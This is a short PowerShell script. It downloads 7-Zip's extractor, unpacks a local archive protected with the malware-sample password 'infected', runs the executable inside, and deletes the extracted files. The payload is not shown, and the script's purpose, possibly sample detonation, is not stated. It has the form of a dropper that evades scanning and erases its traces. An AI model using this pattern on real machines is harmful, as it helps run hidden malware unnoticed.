# Define URLs and paths
$downloadUrl = "https://www.7-zip.org/a/7zr.exe"
$sevenZipPath = "$PSScriptRoot\7zr.exe"
$archivePath = "$PSScriptRoot\tools.7z"
$extractPath = "$PSScriptRoot\extracted"
$exeToRun = "file.exe"
$archivePassword = "infected"

# Download 7zr.exe if it doesn't exist
if (-Not (Test-Path $sevenZipPath)) {
    Write-Host "Downloading 7zr.exe..."
    Invoke-WebRequest -Uri $downloadUrl -OutFile $sevenZipPath
}

# Extract the password-protected archive
Write-Host "Extracting archive..."
& $sevenZipPath x $archivePath "-p$archivePassword" "-o$extractPath" -y

# Run the extracted executable
$exePath = Join-Path $extractPath $exeToRun
if (Test-Path $exePath) {
    Write-Host "Running $exeToRun..."
    Start-Process -FilePath $exePath
} else {
    Write-Warning "$exeToRun not found in extracted archive."
}

# Optional: Cleanup
Remove-Item $sevenZipPath -Force
Remove-Item $extractPath -Recurse -Force
